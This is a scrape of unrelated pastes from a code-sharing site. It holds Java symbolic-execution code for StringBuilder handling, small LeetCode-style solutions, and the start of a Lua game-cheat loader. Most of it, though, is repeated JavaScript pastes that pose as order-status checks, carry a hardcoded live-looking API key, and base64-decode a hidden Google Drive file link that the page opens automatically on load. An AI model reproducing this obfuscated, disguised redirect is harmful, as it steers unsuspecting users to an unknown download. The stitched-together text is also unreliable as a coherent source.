	public Instruction handleStringBuilderAppend3(JVMInvokeInstruction invInst, ThreadInfo th) {
		throw new RuntimeException(""implement this"");
	}

	public void setVariableAttribute(ElementInfo ei, JVMInvokeInstruction invInst, ThreadInfo th, StackFrame sf, int idx,
			Object sym_v2) {
		int count = sf.getLocalVariableCount();
		for (int i = 0; i < count; i++) {
			int idx1 = sf.getLocalVariable(i);
			if (idx1 == idx) {
				sf.setLocalAttr(i, sym_v2);
				return;
			}
		}
		// If variable is a static field and not local variable
		ClassInfo ci = sf.getClassInfo();
		FieldInfo[] fields = ci.getDeclaredStaticFields();
		int fieldid = -1;
		for (int i = 0; i < fields.length; i++) {
			if (fields[i].isReference()) {
				fieldid = ci.getStaticElementInfo().getReferenceField(fields[i]);
			}
			if (fieldid == idx) {
				ci.getStaticElementInfo().setFieldAttr(fields[i], sym_v2);
				return;
			}
		}

		// If variable is an instance field and not local variable
		FieldInfo[] fields1 = ci.getDeclaredInstanceFields();
		fieldid = -1;
		for (int i = 0; i < fields1.length; i++) {
			if (fields1[i].isReference()) {
				fieldid = ei.getReferenceField(fields1[i]);
			}
			if (fieldid == idx) {
				ei.setFieldAttr(fields1[i], sym_v2);
				return;
			}
		}
		// if method does not return anything then
		MethodInfo mi = invInst.getInvokedMethod();
		byte b = mi.getReturnTypeCode();
		if (b == Types.T_VOID)
			System.out.println(""WARNING: Could not set variable attribute"");

	}

	public void handleCharAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleCharAppend"");
		} else {
			char s1 = (char) sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Character.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleByteAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleByteAppend"");
		} else {
			byte s1 = (byte) sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Byte.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleShortAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleShortAppend"");
		} else {
			short s1 = (short) sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Short.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleIntAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeIntAppend"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Integer.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleFloatAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeFloatAppend"");
		} else {
			float s1 = Types.intToFloat(sf.pop());
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Float.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleBooleanAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeBooleanAppend"");
		} else {
			boolean s1 = Types.intToBoolean(sf.pop());
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Boolean.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1); /*
																 * String s1 =
																 * AbstractionUtilityMethods.unknownString();
																 * String s2 =
																 * AbstractionUtilityMethods.unknownString();
																 * String s4 =
																 * AbstractionUtilityMethods.unknownString();
																 * String s5 =
																 * AbstractionUtilityMethods.unknownString();
																 */

				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleLongAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(2);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleLongAppend"");
		} else {
			long s1 = sf.popLong();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Long.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleDoubleAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();

		RealExpression sym_v1 = (RealExpression) sf.getLongOperandAttr();
		double s1 = Types.longToDouble(sf.popLong());
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr();
		int s2 = sf.pop();

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand"");
		} else {

			if (sym_v1 == null) { // operand 0 is concrete
				String val = Double.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	/*
	 * String s1 = AbstractionUtilityMethods.unknownString(); String s2 =
	 * AbstractionUtilityMethods.unknownString(); String s4 =
	 * AbstractionUtilityMethods.unknownString(); String s5 =
	 * AbstractionUtilityMethods.unknownString();
	 */

	public void handleObjectAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();

		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);
		// System.out.println(invInst.getSourceLocation());
		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) && (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleObjectAppend"");
		} else {
			int s1 = sf.pop();
			ElementInfo e2 = th.getElementInfo(s1);
			int s2 = sf.pop();
			if (sym_v1 == null || (sym_v1 instanceof SymbolicStringBuilder 
					&& ((SymbolicStringBuilder) sym_v1).getstr() == null)) { // operand 0 is concrete
				String val = getStringEquiv(e2);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				if (sym_v1 instanceof SymbolicStringBuilder)
					sym_v2._append((SymbolicStringBuilder) sym_v1);
				else if (sym_v1 instanceof StringExpression)
					sym_v2._append((StringExpression) sym_v1);
				else {
					throw new RuntimeException(""Object not handled in ObjectAppend"");
				}
				// setVariableAttribute(ei, invInst, th, sf, s2, sym_v2); //set the
				// value of the attribute of local StringBuilder element as sym_v2
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				if (sym_v1 instanceof SymbolicStringBuilder)
					sym_v2._append((SymbolicStringBuilder) sym_v1);
				else if (sym_v1 instanceof StringExpression)
					sym_v2._append((StringExpression) sym_v1);
				else {
					throw new RuntimeException(""Object not handled in ObjectAppend"");
				}

				sf.push(s2, true); /* string Builder element can continue */
			}
			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleStringBuilderAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		SymbolicStringBuilder sym_v1 = (SymbolicStringBuilder) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if (sym_v1 == null)
			sym_v1 = new SymbolicStringBuilder();

		if ((sym_v1.getstr() == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeStringBuilderAppend"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			if (sym_v1.getstr() == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = getStringEquiv(e1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public String getStringEquiv(ElementInfo ei) {
		String objectType = ei.getType();
		if (objectType.equals(""Ljava/lang/StringBuilder;"")) {
			int idx = ei.getReferenceField(""value"");
			int length = ei.getIntField(""count"");
			ElementInfo e1 = VM.getVM().getHeap().get(idx);
			char[] str = e1.asCharArray();
			String val = new String(str, 0, length);
			return val;
		} else if (objectType.equals(""Ljava/lang/StringBuffer;"")) {
			int idx = ei.getReferenceField(""value"");
			int length = ei.getIntField(""count"");
			ElementInfo e1 = VM.getVM().getHeap().get(idx);
			char[] str = e1.asCharArray();
			String val = new String(str, 0, length);
			return val;
		} else if (objectType.equals(""Ljava/lang/Integer;"")) {
			int val = ei.getIntField(""value"");
			return Integer.toString(val);
		} else if (objectType.equals(""Ljava/lang/Float;"")) {
			float val = ei.getFloatField(""value"");
			return Float.toString(val);
		} else if (objectType.equals(""Ljava/lang/Long;"")) {
			long val = ei.getLongField(""value"");
			return Long.toString(val);
		} else if (objectType.equals(""Ljava/lang/Double;"")) {
			double val = ei.getDoubleField(""value"");
			return Double.toString(val);
		} else if (objectType.equals(""Ljava/lang/Boolean;"")) {
			boolean val = ei.getBooleanField(""value"");
			return Boolean.toString(val);
		} else {
			throw new RuntimeException(""ERROR: Object Type Not Handled in getStringVal"");
		}
	}

	public Instruction handletoString(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Object sym_obj_v2 = sf.getOperandAttr(0);
		if (sym_obj_v2 instanceof StringExpression) {
			return null;
		}
		StringExpression sym_v1 = null;
		if (sym_obj_v2 instanceof SymbolicStringBuilder) {
			SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sym_obj_v2;
			sym_v1 = sym_v2.getstr();
		} else {
			throw new RuntimeException(""ERROR: symbolic type not Handled: toString"");
		}

		if ((sym_v1 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: toString"");
		} else {
			sf.pop();
			ElementInfo ei = th.getHeap().newString("""", th);
			int objRef = ei.getObjectRef();
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v1);
		}
		return null;
	}

	public void handleprintln(JVMInvokeInstruction invInst, ThreadInfo th, boolean doPrintln) {
		StackFrame sf = th.getModifiableTopFrame();
		MethodInfo mi = invInst.getInvokedMethod(th);
		String[] argTypes = mi.getArgumentTypeNames();
		Expression sym_v1 = null;
		boolean flag = false;
		if ((argTypes[0].equals(""long"")) || (argTypes[0].equals(""double""))) {
			sym_v1 = (Expression) sf.getLongOperandAttr();
			flag = true;
		} else {
			sym_v1 = (Expression) sf.getOperandAttr(0);
		}

		if ((sym_v1 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: println"");
		} else {
			if (flag)
				sf.popLong();
			else
				sf.pop(); // clear out operand stack
			sf.pop();
			String result = sym_v1.toString();
			if (doPrintln) {
				System.out.println(""Symbolic Exp [ "" + result + ""]"");
			} else {
				System.out.print(""Symbolic Exp [ "" + result + "" ]"");
			}
			th.getHeap().newString("""", th); //Corina this code is so broken
			//th.push(objRef, true);
			//sf.setOperandAttr(sym_v1);
		}
	}
}"
dVf6CVSJ,Untitled,zebmekey,JavaScript,Sunday 6th of April 2025 10:42:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89461/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yKhDDHRH,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 10:27:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56209/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BTUK3Efj,Order.js,zebmekey,JavaScript,Sunday 6th of April 2025 10:12:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09778/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RcH4pkiX,Market.js,zebmekey,JavaScript,Sunday 6th of April 2025 09:56:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23880/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dycPx2q6,Untitled,zebmekey,JavaScript,Sunday 6th of April 2025 09:40:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17410/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xqmaE8Ki,Untitled,i_love_rao_khushboo,Java,Sunday 6th of April 2025 09:36:17 PM CDT,"// https://leetcode.com/problems/find-the-minimum-amount-of-time-to-brew-potions/description/?envType=company&envId=google&favoriteSlug=google-thirty-days

class Solution {
    private boolean isValid(int potionIdx, long startTime, int n, int m, long[] prevEndTime, int[] skill, int[] mana, long[] newEndTime) {
        if (startTime < prevEndTime[0]) {
            return false;
        }

        newEndTime[0] = startTime + ((long) skill[0] * mana[potionIdx]);

        for (int i = 1; i < n; i++) {
            long newStartTimeForIthWizard = newEndTime[i - 1];
            if (newStartTimeForIthWizard < prevEndTime[i]) {
                return false;
            } else {
                newEndTime[i] = newStartTimeForIthWizard + ((long) skill[i] * mana[potionIdx]);
            }
        }

        return true;
    }

    public long minTime(int[] skill, int[] mana) {
        int n = skill.length; // #wizards
        int m = mana.length; // #potions

        long[] endTime = new long[n];

        // for 0th potion, time taken by all n wizards
        for (int i = 0; i < n; i++) {
            if (i == 0) {
                endTime[i] = ((long) skill[i] * mana[0]);
            } else {
                endTime[i] = endTime[i - 1] + ((long) skill[i] * mana[0]);
            }
        }

        for (int potion = 1; potion < m; potion++) {
            long L = endTime[0], R = endTime[n - 1];
            long[] newTentativeEndTime = new long[n];

            boolean isValidFound = false;

            while (L <= R) {
                long mid = L + ((R - L) >> 1L);

                if (isValid(potion, mid, n, m, endTime, skill, mana, newTentativeEndTime)) {
                    isValidFound = true;
                    R = mid - 1;
                } else {
                    L = mid + 1;
                }
            }

            if (isValidFound) {
                endTime = newTentativeEndTime;
            }
        }

        return endTime[n - 1];
    }
}"
7rcCx2cb,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 09:25:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26584/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mGEQ2dx0,Order.js,zebmekey,JavaScript,Sunday 6th of April 2025 09:09:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05187/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ChsYeNar,Untitled,smj007,Python,Sunday 6th of April 2025 09:04:28 PM CDT,"   def maxProfit(self, prices: List[int]) -> int:

        min_price_so_far = float(""inf"")
        max_profit = 0

        for i in range(len(prices)):
            max_profit_so_far = prices[i] - min_price_so_far
            max_profit = max(max_profit, max_profit_so_far)
            min_price_so_far = min(prices[i], min_price_so_far)

        return max_profit"
3meK5U9D,Market.js,zebmekey,JavaScript,Sunday 6th of April 2025 08:54:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25957/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MBaFk1zS,My Menu,rolexttp,Lua,Sunday 6th of April 2025 08:44:34 PM CDT,"if AirHubV2Loaded or AirHubV2Loading or AirHub then
	return
end

getgenv().AirHubV2Loading = true

--// Cache

local game = game
local loadstring, typeof, select, next, pcall = loadstring, typeof, select, next, pcall
local tablefind, tablesort = table.find, table.sort
local mathfloor = math.floor
local stringgsub = string.gsub
local wait, delay, spawn = task.wait, task.delay, task.spawn
local osdate = os.date

--// Launching

